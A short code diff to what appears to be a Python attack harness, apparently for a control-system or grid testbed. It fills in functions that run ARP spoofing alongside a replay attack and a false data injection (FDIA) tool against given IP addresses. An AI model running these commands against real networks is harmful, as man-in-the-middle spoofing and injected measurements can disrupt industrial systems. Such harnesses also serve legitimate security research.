@@ -64,7 +64,7 @@ def run_2_command(command1, command2):
             
         proc1.send_signal(signal.SIGINT)
         proc2.send_signal(signal.SIGINT)
-        sleep(1)
+        sleep(3)
         
     except Exception as e:
         logger('error', f"Error running command: {e}")
@@ -132,14 +132,18 @@ def tcp_flag_injection(ip_addr):
     return
 
 def replay_attack(ip_addr1, ip_addr2):
-    ## Add recording
-    ## to do
+    command1= f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
+    command2 = f'sudo python3 replay_tool.py {ip_addr1} -a -r freqlog.csv'
+    
+    run_2_command(command1, command2)
     
     return
 
 def fdia_attack(ip_addr1, ip_addr2):
-    #make sine wave
-    #to-do
+    command1= f'sudo python3 arp_spoof.py {ip_addr1} {ip_addr2} -i eth0 -r 1'
+    command2 = f'sudo python3 FDIA.py {ip_addr2} -p 30502 -f gaussian'
+    
+    run_2_command(command1, command2)
     
     return
             
